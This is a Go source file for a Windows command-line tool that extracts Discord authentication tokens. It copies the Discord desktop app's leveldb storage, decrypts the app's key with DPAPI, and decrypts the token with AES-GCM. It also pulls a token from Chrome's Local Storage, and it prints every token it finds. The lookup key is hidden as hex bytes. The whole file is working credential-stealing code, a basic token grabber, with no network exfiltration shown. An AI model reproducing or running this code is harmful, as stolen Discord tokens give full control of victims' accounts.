package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"path/filepath"
	"syscall"
	"unsafe"

	"github.com/alexflint/go-arg"
	"github.com/syndtr/goleveldb/leveldb"
)

var tokenKey = []byte{
	'\x5F', '\x68', '\x74', '\x74', '\x70', '\x73', '\x3A', '\x2F', '\x2F',
	'\x64', '\x69', '\x73', '\x63', '\x6F', '\x72', '\x64', '\x2E', '\x63',
	'\x6F', '\x6D', '\x00', '\x01', '\x74', '\x6F', '\x6B', '\x65', '\x6E',
}

var (
	dllcrypt32        = syscall.NewLazyDLL("Crypt32.dll")
	dllkernel32       = syscall.NewLazyDLL("Kernel32.dll")
	procDecryptData   = dllcrypt32.NewProc("CryptUnprotectData")
	procLocalFree     = dllkernel32.NewProc("LocalFree")
	discordPath       = filepath.Join(os.Getenv("appdata"), "discord")
	localStatePath    = filepath.Join(discordPath, "Local State")
	levelDbPath       = filepath.Join(discordPath, "Local Storage", "leveldb")
	chromeLevelDbPath = filepath.Join(
		os.Getenv("localappdata"), "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb")
)

func handleErr(errText string, err error) {
	errString := errText + "\n" + err.Error()
	panic(errString)
}

func parseArgs() (*Args, error) {
	var args Args
	arg.MustParse(&args)
	if !(args.Source >= 1 && args.Source <= 3) {
		return nil, errors.New("Source must be between 1 and 3.")
	}
	return &args, nil
}

func populateDirs(path string) ([]string, error) {
	var paths []string
	files, err := ioutil.ReadDir(path)
	if err != nil {
		return nil, err
	}
	for _, f := range files {
		fname := f.Name()
		if !f.IsDir() && fname != "LOCK" {
			filePath := filepath.Join(path, fname)
			paths = append(paths, filePath)
		}
	}
	return paths, nil
}

func backupLdbFolder(path, tempPath string) error {
	paths, err := populateDirs(path)
	if err != nil {
		return err
	}
	for _, path := range paths {
		srcFile, err := os.OpenFile(path, os.O_RDONLY, 0755)
		if err != nil {
			return err
		}
		destPath := filepath.Join(tempPath, filepath.Base(path))
		destFile, err := os.OpenFile(destPath, os.O_CREATE|os.O_WRONLY, 0755)
		if err != nil {
			srcFile.Close()
			return err
		}
		_, err = io.Copy(destFile, srcFile)
		srcFile.Close()
		destFile.Close()
		if err != nil {
			return err
		}
	}
	return nil
}

func getToken(path string) (string, error) {
	db, err := leveldb.OpenFile(path, nil)
	if err != nil {
		return "", err
	}
	defer db.Close()
	token, err := db.Get(tokenKey, nil)
	if err != nil {
		return "", err
	}
	return string(token[2 : len(token)-1]), nil
}

func getEncToken(path string) ([]byte, error) {
	db, err := leveldb.OpenFile(path, nil)
	if err != nil {
		return nil, err
	}
	defer db.Close()
	_encToken, err := db.Get(tokenKey, nil)
	if err != nil {
		return nil, err
	}
	encToken := _encToken[14 : len(_encToken)-1]
	return base64.StdEncoding.DecodeString(string(encToken))
}

func makeBlob(d []byte) *DataBlob {
	if len(d) == 0 {
		return &DataBlob{}
	}
	return &DataBlob{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DataBlob) toByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func decryptKey(data []byte) ([]byte, error) {
	var outBlob DataBlob
	blob := makeBlob(data)
	r, _, err := procDecryptData.Call(
		uintptr(unsafe.Pointer(blob)), 0, 0, 0, 0, 0x1, uintptr(unsafe.Pointer(&outBlob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outBlob.pbData)))
	return outBlob.toByteArray(), nil
}

func getKey() ([]byte, error) {
	var localState LocalState
	stateBytes, err := ioutil.ReadFile(localStatePath)
	if err != nil {
		return nil, err
	}
	err = json.Unmarshal(stateBytes, &localState)
	if err != nil {
		return nil, err
	}
	key, err := base64.StdEncoding.DecodeString(localState.OSCrypt.EncryptedKey)
	if err != nil {
		return nil, err
	}
	decKey, err := decryptKey(key[5:])
	if err != nil {
		return nil, err
	}
	return decKey, nil
}

func decryptToken(encToken, key []byte) (string, error) {
	nonce := encToken[3:15]
	encTokenWithTag := encToken[15:]
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", nil
	}
	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", nil
	}
	decToken, err := aesgcm.Open(nil, nonce, encTokenWithTag, nil)
	if err != nil {
		return "", nil
	}
	return string(decToken), nil
}

func desktop(tempPath string) (string, error) {
	err := backupLdbFolder(levelDbPath, tempPath)
	if err != nil {
		fmt.Println("Failed to backup ldb folder.")
		return "", err
	}
	encToken, err := getEncToken(tempPath)
	if err != nil {
		fmt.Println("Failed to get encrypted token.")
		return "", err
	}
	key, err := getKey()
	if err != nil {
		fmt.Println("Failed to get local state key.")
		return "", err
	}
	decToken, err := decryptToken(encToken, key)
	if err != nil {
		fmt.Println("Failed to decrypt token.")
		return "", err
	}
	return decToken, nil
}

func chrome(tempPath string) (string, error) {
	err := backupLdbFolder(chromeLevelDbPath, tempPath)
	if err != nil {
		fmt.Println("Failed to backup ldb folder.")
		return "", err
	}
	token, err := getToken(tempPath)
	if err != nil {
		fmt.Println("Failed to get token.")
		return "", err
	}
	return token, nil
}

func main() {
	args, err := parseArgs()
	if err != nil {
		handleErr("Failed to parse args.", err)
	}
	tempPath, err := os.MkdirTemp(os.TempDir(), "")
	if err != nil {
		handleErr("Failed to make temp directory.", err)
	}
	defer os.RemoveAll(tempPath)
	switch args.Source {
	case 1:
		token, err := desktop(tempPath)
		if err != nil {
			handleErr("Failed to dump desktop token.", err)
		}
		fmt.Println(token)
	case 2:
		token, err := chrome(tempPath)
		if err != nil {
			handleErr("Failed to dump Chrome token.", err)
		}
		fmt.Println(token)
	case 3:
		token, err := desktop(tempPath)
		if err != nil {
			handleErr("Failed to dump desktop token.", err)
		}
		fmt.Println(token)
		token, err = chrome(tempPath)
		if err != nil {
			handleErr("Failed to dump Chrome token.", err)
		}
		fmt.Println(token)
	}
}
